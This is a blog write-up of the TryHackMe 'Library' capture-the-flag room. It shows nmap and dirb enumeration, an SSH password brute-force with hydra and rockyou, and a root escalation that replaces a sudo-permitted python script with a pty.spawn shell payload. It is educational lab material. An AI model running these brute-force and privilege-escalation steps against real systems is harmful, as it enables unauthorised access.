---
layout: post
title: 'TryHackMe: Library'
author: AmcaQt
categories: [TryHackMe]
tags: [web, Enumaration, Boot2Root]
render_with_liquid: false
media_subpath: /images/thm_library
image:
    path: room_card.jpeg
date: 2025-11-24 20:32 +0800
---

![TryHackMe Room Link](room_image.PNG){: width="600" height="150" .shadow}
_<https://tryhackme.com/room/bsidesgtlibrary>_

## Description

The **Library** is a Boot2Root machine for FIT and bsides guatemala CTF.

## Gain a Flag

### Enumeration

#### Nmap Scan

![Nmap Scan](Nmap-Scan.PNG)

We see that theres two open Ports:

- 1. 22/tcp ssh
- 2. 80/tcp http 

Port 80 is open, that mean we can view the Website

![Main Page](main-page.png)

From the main page we can see the username **meliodas**, then let's do further Enumerate with [dirb](https://www.kali.org/tools/dirb/). Using this command

```
dirb dir -u MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
```

Then we found one dir that open : `robots.txt`

```
User-agent: rockyou
Disallow: /
```

#### What the user Flag ?

What we got so far :-

```Clue
Username: meliodas
User-agent: rockyou
port 22 is open
```

So now maybe we can try to gain access from ssh with username meliodas. Now we need to brute force the password with hydra and rockyou wordlist.
This is the command:-

```
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://MACHINE_IP -t 64
```

![Hydra Brute Force](hydra-bf.jpg)

using the username and password with login to the machine and we get the initial shell with user flag and python file inside.

![User Flag](flag-user.jpg)

#### What the root Flag

inside the directory `/home/meliodas/` we got two file:-

```
bak.py
user.txt
```

![Python Content](python-content.PNG)

When we run the python file, it just do nothing... haha

First we run the command `sudo -l`, then we got this 

```
User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

The file can run using python by user `meliodas`, but we cannot edit the file as it has only read permissions.

to counter this mechanism, we remove the file then we create the same name file, like this

First we remove the `bak.py`:-

```
rm bak.py
```

And we create the a new file with our payload and run the file:-

```
touch bak.py
echo 'import pty; pty.spawn("/bin/bash")' > /home/meliodas/bak.py
sudo python /home/meliodas/bak.py
```

Now we run and we should get the root access with root flag.

![root Flag](flag-root.jpg)

## Conclusion

Since the machine difficulty is `easy`, this machine is like normal Boot 2 Root. Good for beginner wo want to play Boot 2 Root.

## Happy Hacking

![](https://i.pinimg.com/originals/b4/5a/b1/b45ab1fc7528a020772454fd633afd68.gif)